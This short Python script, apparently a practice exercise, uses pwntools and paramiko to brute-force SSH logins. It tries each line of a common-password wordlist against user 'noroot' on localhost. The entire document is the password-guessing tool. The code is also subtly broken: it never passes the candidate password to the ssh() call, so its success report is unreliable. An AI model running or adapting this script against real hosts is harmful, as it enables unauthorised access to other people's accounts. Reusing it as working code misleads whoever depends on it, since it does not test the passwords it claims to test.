from pwn import *
import paramiko

host="127.0.0.1"
username = "noroot"
attempts = 0
password_file="ssh-common-password.txt"

with open(password_file, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(f"Attempting password: {password}")
            response = ssh(host=host, user=username, timeout=1)
            if response.connected():
                print(f"Valid password found: {password}")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"Invalid Password!")
        attempts += 1

